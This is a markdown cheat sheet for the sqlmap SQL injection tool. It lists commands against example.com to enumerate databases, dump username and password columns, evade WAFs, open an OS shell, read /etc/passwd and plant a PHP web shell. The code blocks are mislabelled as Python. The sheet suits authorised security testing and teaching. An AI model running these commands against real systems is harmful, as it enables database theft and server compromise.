
## 📌 **sqlmap** – Essential Concepts & Commands

## 🧠 What is **sqlmap**?

**sqlmap** is an automated tool for detecting and exploiting SQL injection vulnerabilities and taking over database servers.

---

## ⚙️ Basic Usage

```Python
sqlmap -u "http://example.com/page?id=1"
```

- `-u` → Target URL
- Automatically tests for SQL injection

---

## 🔍 Detection Techniques

sqlmap supports multiple SQLi techniques:

- **Boolean-based blind**
- **Time-based blind**
- **Error-based**
- **Union-based**
- **Stacked queries**

Example (force technique):

```Python
sqlmap -u "http://example.com?id=1" --technique=BEU
```

- `B` = Boolean
- `E` = Error
- `U` = UNION

---

## 🧪 Enumerating Databases

### List databases

```Python
sqlmap -u "http://example.com?id=1" --dbs
```

### List tables

```Python
sqlmap -u "http://example.com?id=1" -D database_name --tables
```

### List columns

```Python
sqlmap -u "http://example.com?id=1" -D database_name -T table_name --columns
```

---

## 📥 Dumping Data

```Python
sqlmap -u "http://example.com?id=1" -D database_name -T table_name --dump
```

Dump specific columns:

```Python
sqlmap -u "http://example.com?id=1" -D db -T users -C username,password --dump
```

---

## 🍪 Working with Cookies

```Python
sqlmap -u "http://example.com" --cookie="PHPSESSID=abcd1234"
```

---

## 📡 POST Requests

```Python
sqlmap -u "http://example.com/login" --data="username=admin&password=pass"
```

---

## 🔐 Authentication (Login Sessions)

```Python
sqlmap -u "http://example.com/profile" --cookie="session=xyz"
```

---

## 🎯 Targeting Specific Parameters

```Python
sqlmap -u "http://example.com/page?id=1&cat=2" -p id
```

- `-p` → test only selected parameter

---

## ⚡ Increasing Speed

```Python
sqlmap -u "http://example.com?id=1" --threads=10
```

---

## 🧬 User-Agent & Headers

```Python
sqlmap -u "http://example.com" --user-agent="Mozilla/5.0"
```

Custom headers:

```Python
sqlmap -u "http://example.com" --headers="X-Forwarded-For: 127.0.0.1"
```

---

## 🧱 Bypassing WAF / Filters

```Python
sqlmap -u "http://example.com?id=1" --tamper=space2comment
```

Multiple tamper scripts:

```Python
--tamper=space2comment,randomcase
```

---

## 🧑‍💻 OS Shell Access

```Python
sqlmap -u "http://example.com?id=1" --os-shell
```

---

## 📂 File System Access

Read file:

```Python
sqlmap -u "http://example.com?id=1" --file-read="/etc/passwd"
```

Write file:

```Python
sqlmap -u "http://example.com?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

---

## 🛠️ Batch Mode (No Prompts)

```Python
sqlmap -u "http://example.com?id=1" --batch
```

---

## 📊 Verbosity Levels

```Python
-v 0  → minimal  
-v 3  → default  
-v 6  → debug level
```

Example:

```Python
sqlmap -u "http://example.com?id=1" -v 3
```

---

## 🔎 Risk & Level Settings

```Python
--level=1-5   (default: 1)  
--risk=1-3    (default: 1)
```

Example:

```Python
sqlmap -u "http://example.com?id=1" --level=5 --risk=3
```

---

## 🔁 Crawling a Website

```Python
sqlmap -u "http://example.com" --crawl=2
```

---

## 📌 Output Directory

```Python
--output-dir=/path/to/output
```

---

## ⚠️ Notes

- Always have **permission** before testing.
- Can be noisy—may trigger IDS/WAF alerts.
- Works best with clearly injectable parameters.

---

## 🧩 Quick Workflow Example

```Python
sqlmap -u "http://example.com?id=1" --dbs  
sqlmap -u "http://example.com?id=1" -D testdb --tables  
sqlmap -u "http://example.com?id=1" -D testdb -T users --dump
```

---
